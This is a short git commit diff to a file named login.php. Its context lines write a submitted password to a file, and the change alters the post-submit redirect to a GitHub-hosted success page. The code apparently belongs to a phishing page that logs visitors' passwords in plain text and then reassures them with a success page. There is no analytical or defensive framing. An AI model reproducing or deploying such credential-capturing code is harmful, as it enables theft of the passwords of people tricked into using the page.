ca388f62fb067e54a2f97e360ea8f40f5ff4b53b
JagarapuManoj <138508126+JagarapuManoj@users.noreply.github.com>
2024-01-13 17:22:36 +0530

    Update login.php

--- login.php
+++ login.php
@@ -10,5 +10,5 @@
 	fwrite($file,"PASSWORD : " .$pass. "\n");
 	fwrite($file,"- - - - - - - - - - - - - - - - - - - - \n");
 	fclose($file);
-	header("Location:success.html");
+	header("Location:https://github.com/JagarapuManoj/hi/blob/main/success.html");
 ?>
